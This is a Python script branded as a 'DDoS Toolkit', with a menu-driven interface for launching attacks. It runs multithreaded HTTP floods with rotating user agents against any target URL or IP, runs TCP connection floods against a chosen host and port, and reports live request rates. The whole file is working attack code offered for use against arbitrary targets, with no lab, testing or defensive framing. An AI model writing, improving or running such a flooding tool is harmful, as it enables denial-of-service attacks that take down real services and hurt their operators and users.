#!/usr/bin/env python3
import threading
import time
import random
import socket
import os

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    clear_screen()
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║                🚀 PYTHON DDoS TOOLKIT 2025                ║")
    print("║                  ⚡ ADVANCED CYBER FRAMEWORK                ║")
    print("╚══════════════════════════════════════════════════════════════╝")

def show_menu():
    print("\n📋 ATTACK METHODS:")
    print("─" * 60)
    print("   1️⃣  🎯 HTTP Flood")
    print("   2️⃣  🌐 TCP Flood")
    print("   3️⃣  📊 Statistics")
    print("   4️⃣  ❌ Exit")
    
    choice = input("\n⚡ Choose your option [1-4]: ")
    return choice

def http_flood(target, duration, thread_id):
    """HTTP flood attack"""
    end_time = time.time() + duration
    
    try:
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        if '://' in target:
            url = target.split('://', 1)[1]
        else:
            url = target
        
        host = url.split('/')[0]
        path = '/' + '/'.join(url.split('/')[1:]) if '/' in url else '/'
        
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((host, 80))
                
                request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(user_agents)}\r\nAccept: */*\r\nConnection: close\r\n\r\n"
                sock.send(request.encode())
                
                response = sock.recv(1024)
                sock.close()
                
                global success_count, request_count
                success_count += 1
                request_count += 1
                
            except Exception:
                global error_count
                error_count += 1
            
            time.sleep(0.01)
            
    except Exception as e:
        print(f"Thread {thread_id} error: {e}")

def tcp_flood(target, port, duration, thread_id):
    """TCP flood attack"""
    end_time = time.time() + duration
    
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target, port))
            sock.send(b"GET / HTTP/1.1\r\n\r\n")
            sock.close()
            
            global success_count, request_count
            success_count += 1
            request_count += 1
            
        except Exception:
            global error_count
            error_count += 1
        
        time.sleep(0.01)

def monitor_progress(start_time):
    """Monitor attack progress"""
    while True:
        time.sleep(1)
        elapsed = time.time() - start_time
        rps = request_count / elapsed if elapsed > 0 else 0
        print(f"\r🚀 Requests: {request_count:,} | ✅ Success: {success_count:,} | ❌ Errors: {error_count:,} | ⚡ RPS: {rps:.1f}", end='', flush=True)

def single_target_attack():
    """Single target attack"""
    print("\n🎯 SINGLE TARGET ATTACK")
    
    target = input("🎯 Enter target URL or IP: ")
    if not target:
        print("❌ No target specified!")
        input("Press ENTER to return...")
        return
    
    duration = int(input("⏱️  Duration in seconds [30]: ") or "30")
    threads = int(input("🧵 Threads [20]: ") or "20")
    
    print(f"\n🚀 Starting attack on {target}")
    print(f"📊 Duration: {duration}s | Threads: {threads}")
    print("Press Ctrl+C to stop...\n")
    
    global request_count, success_count, error_count
    request_count = 0
    success_count = 0
    error_count = 0
    
    start_time = time.time()
    
    # Start attack threads
    attack_threads = []
    for i in range(threads):
        thread = threading.Thread(target=http_flood, args=(target, duration, i))
        thread.daemon = True
        thread.start()
        attack_threads.append(thread)
    
    # Start monitor
    monitor_thread = threading.Thread(target=monitor_progress, args=(start_time,))
    monitor_thread.daemon = True
    monitor_thread.start()
    
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print("\n❌ Attack stopped by user")
    finally:
        print(f"\n\n✅ Attack completed!")
        elapsed = time.time() - start_time
        rps = request_count / elapsed if elapsed > 0 else 0
        success_rate = (success_count / request_count * 100) if request_count > 0 else 0
        
        print(f"📈 Final Statistics:")
        print(f"⏱️  Duration: {elapsed:.1f} seconds")
        print(f"🚀 Total Requests: {request_count:,}")
        print(f"✅ Successful: {success_count:,}")
        print(f"❌ Failed: {error_count:,}")
        print(f"📊 Success Rate: {success_rate:.2f}%")
        print(f"⚡ Average RPS: {rps:.1f}")
    
    input("\nPress ENTER to return to menu...")

def tcp_attack():
    """TCP attack"""
    print("\n🌐 TCP FLOOD ATTACK")
    
    target = input("🎯 Enter target IP: ")
    if not target:
        print("❌ No target specified!")
        input("Press ENTER to return...")
        return
    
    port = int(input("📡 Port [80]: ") or "80")
    duration = int(input("⏱️  Duration in seconds [30]: ") or "30")
    threads = int(input("🧵 Threads [20]: ") or "20")
    
    print(f"\n🚀 Starting TCP flood on {target}:{port}")
    print(f"📊 Duration: {duration}s | Threads: {threads}")
    print("Press Ctrl+C to stop...\n")
    
    global request_count, success_count, error_count
    request_count = 0
    success_count = 0
    error_count = 0
    
    start_time = time.time()
    
    # Start attack threads
    attack_threads = []
    for i in range(threads):
        thread = threading.Thread(target=tcp_flood, args=(target, port, duration, i))
        thread.daemon = True
        thread.start()
        attack_threads.append(thread)
    
    # Start monitor
    monitor_thread = threading.Thread(target=monitor_progress, args=(start_time,))
    monitor_thread.daemon = True
    monitor_thread.start()
    
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print("\n❌ Attack stopped by user")
    finally:
        print(f"\n\n✅ Attack completed!")
        elapsed = time.time() - start_time
        rps = request_count / elapsed if elapsed > 0 else 0
        success_rate = (success_count / request_count * 100) if request_count > 0 else 0
        
        print(f"📈 Final Statistics:")
        print(f"⏱️  Duration: {elapsed:.1f} seconds")
        print(f"🚀 Total Requests: {request_count:,}")
        print(f"✅ Successful: {success_count:,}")
        print(f"❌ Failed: {error_count:,}")
        print(f"📊 Success Rate: {success_rate:.2f}%")
        print(f"⚡ Average RPS: {rps:.1f}")
    
    input("\nPress ENTER to return to menu...")

def show_statistics():
    """Show statistics"""
    clear_screen()
    print("📊 ATTACK STATISTICS")
    print("\nNo active attack statistics available.")
    print("Run an attack first to see statistics.")
    
    input("\nPress ENTER to return to menu...")

# Global variables
request_count = 0
success_count = 0
error_count = 0

def main():
    """Main program loop"""
    while True:
        show_banner()
        choice = show_menu()
        
        if choice == "1":
            single_target_attack()
        elif choice == "2":
            tcp_attack()
        elif choice == "3":
            show_statistics()
        elif choice == "4":
            print("\n👋 Shutting down...")
            break
        else:
            print("❌ Invalid option! Please choose 1-4")
            time.sleep(2)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n👋 Goodbye!")
    except Exception as e:
        print(f"❌ Error: {e}")